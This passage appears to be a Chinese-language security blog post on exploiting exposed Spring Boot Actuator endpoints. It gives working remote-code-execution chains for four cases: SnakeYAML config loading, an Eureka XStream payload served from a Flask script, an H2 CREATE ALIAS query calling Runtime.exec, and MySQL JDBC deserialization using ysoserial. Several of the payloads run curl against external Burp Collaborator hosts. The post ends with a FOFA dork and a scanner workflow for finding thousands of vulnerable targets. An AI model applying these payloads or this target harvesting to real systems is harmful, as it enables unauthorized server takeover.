#### **1.spring cloud SnakeYAML RCE**
    cd springcloud-snakeyaml-rce
    mvn spring-boot:run
>   * 目标依赖的 `spring-cloud-starter` 版本 \
>
> 现在最新版本3.03,古老的洞了，基本很少遇到，遇到就是好用。
**(1)制作payload.jar文件**
下载payload
    git clone https://github.com/artsploit/yaml-payload.git
    cd yaml-payload/src/artsploit
替换命令执行内容
    sed -i "" 's/dig scriptengine.x.artsploit.com/curl c0dy0qcncknp8zpb5bir0jvt4kaayz.burpcollaborator.net/g' AwesomeScriptEngineFactory.java
编译
    cd ../../
    javac src/artsploit/AwesomeScriptEngineFactory.java
    jar -cvf payload.jar -C src/ .
在该目录生成利用的example.yml文件,内容如下:
    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://127.0.0.1:9091/payload.jar"]
      ]]
    ]
web服务挂载
    python3 -m http.server 9091
**(2) 利用**
    curl -X POST --data 'spring.cloud.bootstrap.location=http://127.0.0.1:9091/example.yml' localhost:9092/env
刷新即可成功触发
    curl -X POST localhost:9092/refresh
* * *
#### **2.eureka xstream deserialization RCE**
    cd springboot-eureka-xstream-rce
    mvn spring-boot:run
> 影响版本: eureka-client 
> 目前最新版:3.03
**(1)编写利用脚本**
    #!/usr/bin/env python
    # coding: utf-8
    from flask import Flask, Response
    app = Flask(__name__)
    @app.route('/', defaults={'path': ''})
    @app.route('/', methods=['GET', 'POST'])
    def catch_all(path):
      command = "curl i5o45whthqsvd5uhahnx5p0z9qfh36.burpcollaborator.net"
      xml = """
                           /bin/bash
                           -c
                           {command}
                        false
                        java.lang.ProcessBuilder
                        start
                      foo
                    foo
    """.format(command=command)
      return Response(xml, mimetype='application/xml')
    if __name__ == "__main__":
        app.run(host='0.0.0.0', port=8090)
**(2)设置 eureka.client.serviceUrl.defaultZone 属性**
*有的话这里要先记录下本来的属性值
    curl -H 'Content-Type: application/x-www-form-urlencoded' -X POST --data "eureka.client.serviceUrl.defaultZone=http://127.0.0.1:8090/xxxxxsuibiantianxx" http://localhost:9093/env
成功设置,如下图所示:
**(3) 触发**
    curl -X POST http://localhost:9093/refresh
成功执行请求，也执行了命令。
* * *
**(4)恢复 eureka.client.serviceUrl.defaultZone**
如果不恢复的话，那么就会一直执行，系统也会一直报错。
    curl -H 'Content-Type: application/x-www-form-urlencoded' -X POST --data "eureka.client.serviceUrl.defaultZone="原先的值" http://localhost:9093/env
然后刷新，使用新配置
    curl -X POST http://localhost:9093/refresh
* * *
#### **3.restart h2 database query RCE**
    cd springboot-h2-database-rce
    mvn spring-boot:run
> 影响版本:(未知) 我改了配置文件，直接用了最新版的来做演示
>
> 目前最新版:1.4.200
**(1) 设置spring.datasource.hikari.connection-test-query**
    cmd.json:
    {"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('/bin/sh','-c','curl 0bcmbenbn8ydjn0zgztfb76hf8l29r.burpcollaborator.net');"}
    curl -H "Content-Type:application/json" -X POST  -d @/tmp/cmd.json http://localhost:9096/actuator/env
成功设置.
**(2) 触发RCE**
    curl -H "content-Type:  application/json" -X POST http://localhost:9096/actuator/restart
过程出现了如下错误，执行完一次，需要新创建个其他函数，或者先删除掉。:
    sed -i "" s/T5/T6/g /tmp/cmd.json
同时要注意，命令执行linux和window的区别。如图所示，可以成功RCE
* * *
#### **4.mysql jdbc deserialization RCE**
    cd springboot-mysql-jdbc-rce
    mvn spring-boot:run
运行之前,需要配置一下数据库连接，要不然运行会失败的，这里我启用了我本地的mysql。
查看下pom.xml的mysql-connector-java的依赖为8.0.12,cc依赖为3.2.1:
                mysql
                mysql-connector-java
                8.0.12
                commons-collections
                commons-collections
                3.2.1
                runtime
先访问:
记录好原先的`spring.datasource.url`:
    [application.properties]:6:43"},"spring.datasource.url":{"value":"jdbc:mysql://127.0.0.1:3306/test","origin":"class path resource
利用ysoserial生成反序列化payload:
    java -jar ysoserial-0.0.8-SNAPSHOT-all.jar  CommonsCollections3 'curl rb617n72nqnqaj8ijbiw36v7nytohd.burpcollaborator.net' > payload.ser
下载rce.py脚本:
    wget --no-check-certificate https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py
编辑下脚本的端口3306为3307，避开本机的3306冲突。
**(1)修改变量**
value的值，mysql8.x填入:
    jdbc:mysql://127.0.0.1:3307/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
如果是5.x则是:
    jdbc:mysql://127.0.0.1:3307/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
> 两者区别:
    curl -H "Content-Type:application/json" -X POST  --data '{"name":"spring.datasource.url","value":"jdbc url' http://localhost:9097/actuator/env
**(2)刷新配置**
    curl -H "Content-Type:application/json" -X POST  http://localhost:9097/actuator/refresh
这里也可以通过`restart`来触发。
    curl -H "content-Type:  application/json" -X POST http://localhost:9097/actuator/restart
**(3)访问数据库操作触发**
先监听3307，这里注意使用Py2，利用脚本不支持Py3，会出错。
    python springboot-jdbc-deserialization-rce.py
接下来访问即可。
`curl http://localhost:9097/product/list`
关于这个，其实在真实环境中，都不用自己去触发，自带的其他操作都会导致进行数据库连接。
**(4)恢复Spring.datasource.url**
当我们获得RCE之后，前面记录的本来的jdbc url就可以还原回去了，操作如下。
    curl -H "Content-Type:application/json" -X POST  --data '{"name":"spring.datasource.url","value":"jdbc:mysql://127.0.0.1:3306/test' http://localhost:9097/actuator/env
最终，在测试过程，我发现，有请求访问伪造的mysql服务，但是Spring-boot进程却在序列化的过程中报错退出了，导致命令没有执行成功。
这个是jdk版本导致的，改用cc6来解决
    java -jar ysoserial-0.0.8-SNAPSHOT-all.jar  CommonsCollections6 ' open -a Calculator.app' > payload.ser
#### 5.More ...
还有很多关于这个利用，发现过程主要是Fuzz一些依赖暴露出的端点，然后深入利用，后面会掺杂来谈谈。
## 0x5 漏洞检测
(1) 收集目标，为了方便演示使用FoFa收集目标。
    FOFA Dork: body="Whitelabel Error Page" && country="CN"
(2)使用SB-Actuator, 代码实现可以自己去尝试改进下，第二个选择是nuclei但是没这个覆盖全面,但是支持自己继续定义。
    git clone https://github.com/rabbitmask/SB-Actuator.git
(3) 检测结果
获取1w的目标，然后http检测保存为200.txt
    cat target.txt | httpx -o 200.txt
接着执行`python3 SB-Actuator.py -f 200.txt`,结果如下所示:
这种针对性检测的话，成功率本身就是比较高的，但是测试的时候记得要授权，遵纪守法!
## 0x6 总 结
本文偏实践化，先从Actutator介绍开篇到讨论其版本差异，然后提出了3种类型的漏洞利用思路，最后，介绍了实践中如何使用检测该漏洞的自动化工具。其中，有几个问题是我没有解决的(先留个悬念)，但是可以通过阅读actuator的源码来解决，放在下篇文章中，还有就是关于命令执行也较为常见的jolokia端点、其他依赖端点等没有进行讨论，这个我也想放在偏从源代码分析原理的文章中。总的来说，java的研究还是少数人，很多问题需要自己去读源码来解决，这个需要一定的时间作为基础，但是这个前后就花了不少时间，这个过程相比于阅读源代码来说虽然时间短一些，但是非常枯燥和容易产生很多困惑。
## 0x7 参考链接
[Spring Boot & Actuator](https://www.jianshu.com/p/14d10481845e)
[Spring Boot Vulnerability Exploit Check
List](https://github.com/LandGrey/SpringBootVulExploit)
[Spring Boot Actuator详解与深入应用（一）：Actuator
1.x](https://juejin.cn/post/6844903715556556807)
[警惕 Spring Boot Actuator 引发的安全漏洞](https://www.cnkirito.moe/spring-boot-actuator-notes/)
[Exploiting Spring Boot
Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
[Spring Boot Actuator(eureka xstream deserialization
RCE)漏洞测试及修复](https://forum.butian.net/share/135)